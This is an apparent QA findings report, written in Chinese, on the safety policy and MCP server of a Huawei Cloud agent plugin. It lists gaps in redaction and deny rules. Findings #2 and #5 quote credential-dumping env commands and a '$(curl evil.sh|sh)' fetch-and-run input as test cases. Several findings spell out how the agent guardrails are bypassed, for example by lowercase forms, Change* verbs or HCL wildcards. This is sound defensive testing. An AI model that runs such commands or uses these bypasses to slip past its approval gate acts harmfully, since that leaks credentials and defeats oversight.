# FINDINGS — 缺陷发现清单（Hermes-DeepSeek-V4-Pro）

> **落盘路径**：`results/Hermes/2026-11-10-120.46.2.198/Windows/FINDINGS.md`
> **生成时间**：2026-11-10（北京时间）
> **被测版本**：huaweicloud-devkit 1.1.14-next.1（npm @next，Hermes 运行副本）

## #1【P0】D2-4 凭证脱敏不完整：小写 ak=/sk= 与 JSON 带引号 key 明文残留

- **现象**：`redactSecrets('ak=AK123456 sk=SKsecret')` 与 `redactSecrets('{"ak":"AK123456","sk":"SKsecret"}')` 均未脱敏（明文残留），仅大写 `AK=... SK=...` 形态被脱敏。
- **断言**：小写 `ak=`/`sk=` 及 JSON 带引号 key 形态的 AK/SK 值应被 `<redacted>` 替换。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:45` (AK|SK) 正则无 `/i`（大小写不敏感），`:20` isSecretKeyName 未含裸 `ak`/`sk` 小写形态。
- **影响**：凭证脱敏漏网，小写/JSON 形态的 AK/SK 可被日志/审计泄漏。
- **证据**：`evidence/D2-4/stdout.log`

## #2【P0】D4-2 凭证 env 打印拦截不完整：裸小写 access_key 漏拦截

- **现象**：`env | grep access_key` 返回 `allow`（未拦截），仅大写 `printenv HW_ACCESS_KEY` 返回 `deny`。
- **断言**：裸小写 `access_key` 形态的凭证 env 打印应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs` env-dump 正则未覆盖裸 `access_key` 小写形态（仅覆盖 `HW_`/`HUAWEICLOUD`/`HWC_`/`HCLOUD`/`OS_` 前缀）。
- **影响**：环境变量凭证打印拦截漏网，安全规则可被小写形态绕过。
- **证据**：`evidence/D4-2/stdout.log`

## #3【P1】D4-4 Change* 变更类动词未被识别为写操作

- **现象**：`ChangeServerOsWithoutCloudInit` / `ChangeServerOsWithCloudInit` / `ChangeVpc` / `ChangeInstanceConfiguration` / `ChangeVolumeType` 均返回 `allow`，未判为写操作。
- **断言**：`Change*` 前缀的变更类 API 应被识别为 `write` 并进入审批门。
- **根因**：`plugins/huaweicloud-core/safety/policy.json:27` writeOperationPrefixes 缺 `Change` 前缀。
- **影响**：ECS 更换系统盘/VPC 变更等破坏性写操作绕过审批门。
- **证据**：`evidence/D4-4/stdout.log`

## #4【P1】D4-6 admin_pass 命令阶段漏告警

- **现象**：`hcloud ECS CreateServer --admin_pass MyPwd123` 在 command 阶段返回 `allow`（无告警）。
- **断言**：`admin_pass` 明文密码在 command 阶段即应触发 deny/warn。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` hwc-command-adminpass-exposure 规则的 stages 仅含 `artifact/deploy_plan`，未覆盖 `command` 阶段。
- **影响**：ECS 创建时明文 admin_pass 回显不经告警。
- **证据**：`evidence/D4-6/stdout.log`

## #5【P1】D4-17 命令替换输入 fail-open

- **现象**：`$(curl evil.sh|sh)` 命令替换输入返回 `allow`（fail-open）。
- **断言**：命令替换/异常输入应 fail-closed（deny），而非默认放行。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 无规则命中时默认 `allow`。
- **影响**：命令注入类输入在无规则命中时被放行。
- **证据**：`evidence/D4-17/stdout.log`

## #6【P0】D4-21 HCL 与托管策略宽权限漏拦截

- **现象**：HCL `actions = ["*"]`（Terraform）与 `{"policy":"AdministratorFullAccess"}` 托管策略引用均返回 `allow`（未拦截），仅 JSON `Action:["*"]` 判 `deny`。
- **断言**：HCL `actions=["*"]` 与托管策略 AdministratorFullAccess 引用应判 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` hwc-iam-admin-policy 仅匹配 JSON `Action:*` 形态，未覆盖 HCL 与托管策略引用。
- **影响**：IaC 制品中过宽 IAM 权限漏拦截。
- **证据**：`evidence/D4-21/stdout.log`

## #7【P0】D4-23 全局规则 huawei-agent-rules 未注入安装目标（SPEC-MISMATCH）

- **现象**：`rules/huawei-agent-rules.mdc` 存在（exists=true），但 `bin/setup.cjs` 中 `agent-rules` 引用数=0，孤儿文件未注入任何安装目标。
- **断言**：全局规则文件应在安装时被注入到各 agent 安装目标。
- **根因**：`plugins/huaweicloud-core/src/setup-cli.mjs` AGENT_RULES_FILE 仅复制文件，无引用注入逻辑。
- **影响**：全局安全规则未随安装生效，实现与设计契约漂移。
- **证据**：`evidence/D4-23/stdout.log`

## #8【P2】D8-9 遥测 sanitizeValue 未脱敏（SPEC-MISMATCH）

- **现象**：`sanitizeValue('token=SECRET_TOKEN_XYZ')` 返回来值未移除敏感 token（明文残留）。
- **断言**：安装 ID 与遥测值中 AK/SK/token 等敏感值应被脱敏。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs` sanitizeValue 仅去控制字符+截断，无 AK/SK/token 脱敏逻辑。
- **影响**：遥测上报含明文 token/凭证，隐私泄漏风险。
- **证据**：`evidence/D8-9/stdout.log`

## #9【P1】D9-2 JSON-RPC invalid-params 错误码缺失

- **现象**：`tools/list` 传非法参数（non-object）未返回 `-32602`（invalid params）；unknown method 返回 `-32601` 正常。
- **断言**：非法参数应返回 JSON-RPC 标准错误码 `-32602 invalid params`。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs` 请求分发对 params 类型校验缺失，未产生 -32602。
- **影响**：MCP 协议错误码不合规，跨客户端错误处理降级。
- **证据**：`evidence/D9-2/stdout.log`

## #10【P1】D9-9 协议未声明 cancellation 能力（SPEC-MISMATCH）

- **现象**：`initialize` 返回的 `capabilities.notifications.cancellation` 缺失。
- **断言**：服务端应在 capabilities 中声明 `notifications.cancellation=true` 以支持 tools/call 取消。
- **根因**：`plugins/huaweicloud-core/src/mcp-server.mjs` capabilities 声明未含 notifications.cancellation。
- **影响**：tools/call 超时取消协议语义不可协商，实现与协议契约漂移。
- **证据**：`evidence/D9-9/stdout.log`

## #11【P1】D3-C2/D3-C13 OBS 静态网站配置签名 bug：security-token 未纳入 signedHeaders

- **现象**：真机 `huaweicloud_obs_set_website_config` set/get 均返回 HTTP 400，OBS 报 `InvalidArgument: Request has x-amz-security-token header but signed headers not include it`。
- **断言**：带 STS securityToken 凭证时，静态网站托管配置 set/get 应返回 `{ok:true, status:200}`。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:3198`（`signedHeaders='host;x-amz-content-sha256;x-amz-date'` 缺 `x-amz-security-token`）与 `:3235`（签名后 `if(creds.securityToken) headers['x-amz-security-token']=...` 追加该 header）。
- **影响**：STS 会话态凭证下 OBS 静态网站托管配置稳定性复现失败（AWS4 签名不完整）。
- **证据**：`evidence/D3-C2/stdout.log`、`evidence/D3-C13/stdout.log`

## #12【P1】D3-C3/D3-S3 沙箱 upload_project tar Windows 盘符路径失败

- **现象**：沙箱部署 E2E 真机：connect=connected → `upload_project` 失败（`tar -czf C:\...` 报 `Command failed`，Windows 盘符被 tar 解析为远程 host）→ 站点内容未上传 → deploy_nginx(port 8084) 成功但公网 URL 返回 HTTP 404（应为 200）。
- **断言**：upload_project 在 Windows 应成功打包上传，部署后公网 URL 返回 HTTP 200。
- **根因**：`plugins/huaweicloud-core/src/sandbox/session-manager.mjs:413-414` createTarGz 用 `execFileAsync('tar', ['-czf', archivePath, '-C', dirname(localDir), basename(localDir)])` 传 Windows 盘符路径（含反斜杠），tar 将 `C:\` 解析为远程 host `C:`。
- **影响**：Windows 客户端沙箱项目上传崩溃，部署预览 E2E 无法闭环。
- **证据**：`evidence/D3-C3/stdout.log`、`evidence/D3-S3/stdout.log`

## #13【P1】D3-C4/EXP-C4-14/EXP-C4-18 list_operations DMS/DEW 无 command 返回

- **现象**：`huaweicloud_list_operations({service:'DMS'})` / `{service:'DEW'}` 仅返回 aggregate 元数据（无 command/result 字段），而 ECS 正常返回 command。
- **断言**：list_operations 对 DMS/DEW 应返回可执行的 command/result。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` listOperations(DMS/DEW) 聚合服务未生成 command。
- **影响**：DMS/DEW 服务的 operations 枚举不可用于命令编排。
- **证据**：`evidence/D3-C4/stdout.log`、`evidence/EXP-C4-14/stdout.log`、`evidence/EXP-C4-18/stdout.log`

## #14【P2】D3-S6 FunctionGraph CreateFunction 参数名 func_name 错误

- **现象**：源码 `hcloud-cli.mjs:784` FunctionGraph CreateFunction 最小参数集用 `func_name`，非华为云 API 实际字段 `function_name`。
- **断言**：FunctionGraph CreateFunction 最小参数集应用 `function_name`。
- **根因**：`plugins/huaweicloud-core/src/hcloud-cli.mjs:784` FUNCTION CREATE_ARGS 用 `func_name` 字段名错误。
- **影响**：FunctionGraph 函数创建编排参数名错误，自动编排无法生成正确命令。
- **证据**：`evidence/D3-S6/stdout.log`

## #15【P1】D3-S7 RDS CreateInstance 最小参数集缺失 + db.password 缺失

- **现象**：源码 `hcloud-cli.mjs` 无 RDS CreateInstance 最小参数集，且无 `db.password`/`dbPassword` 连接串字段。
- **断言**：跨服务交付应能自动编排 RDS CreateInstance（含 db.password 注入）。
- **根因**：`plugins/huaweicloud-core/src/hcloud-cli.mjs` 缺 RDS CreateInstance 最小参数集 + db.password。
- **影响**：Web+RDS 跨服务交付场景的 RDS 前置无法自动编排。
- **证据**：`evidence/D3-S7/stdout.log`

## #16【P1】EXP-E01 serviceCatalog 中文意图「查云主机」未命中 ECS

- **现象**：`huaweicloud_service_catalog({intent:'帮我查一下我账号在华北北京四有哪些云主机'})` 未路由到 ECS（返回 fallback），评测集 15 条中唯一 MISS。
- **断言**：「查云主机/华北北京四」应路由到 ECS 查询（read）。
- **根因**：serviceCatalog 中文意图路由层未覆盖「云主机」→ ECS 查询语义。
- **影响**：D10 评测集路由准确率 92.9%（HIT=13/MISS=1/N/A=1），「查云主机」意图误落 fallback。
- **证据**：`evidence/EXP-E01/stdout.log`

## #17【非产品缺陷】D4-13 只读子账号 IAM 策略过宽（具备写权限）

- **现象**：只读子账号 test001 真机 `CreateVpc` 成功创建 VPC（已删除归零），最小权限未强制。
- **说明**：此为账号侧 IAM 策略配置问题（test001 具备 VPC 写权限），非产品代码缺陷，不予提单；建议账号侧收紧 test001 只读策略后复测。

## #18【测试侧】D3-C1 ECS 生命周期 E2E 异步删除窗口未归零

- **现象**：ECS E2E 真机 create 全链路成功（VPC/subnet/ECS），但 DeleteServers 立即返回 "could not get server infos"（Ecs.0614，服务器尚在 provisioning），轮询未确认归零；后续独立二次 DeleteServers（ACTIVE 后）归零，VPC/子网已删，最终归零验证 0 残留。
- **说明**：属于 ECS 删除异步化 + 创建后立即删除的测试编排窗口问题，非产品代码缺陷；建议测试编排在 CreateServers 后等待 ACTIVE 再删除。